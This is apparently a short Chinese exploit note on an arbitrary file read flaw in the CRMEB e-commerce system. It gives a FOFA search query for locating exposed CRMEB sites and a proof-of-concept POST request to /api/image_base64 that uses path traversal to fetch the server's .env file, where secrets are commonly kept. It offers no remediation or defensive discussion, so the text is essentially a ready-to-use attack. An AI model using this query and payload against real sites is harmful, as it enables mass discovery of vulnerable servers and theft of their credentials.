## CRMEB任意文件读取漏洞


## fofa

```
body="/wap/first/zsff/iconfont/iconfont.css" || body="CRMEB"
```

## poc

```
POST /api/image_base64 HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded

image=http://<host>/../.env&code=
```
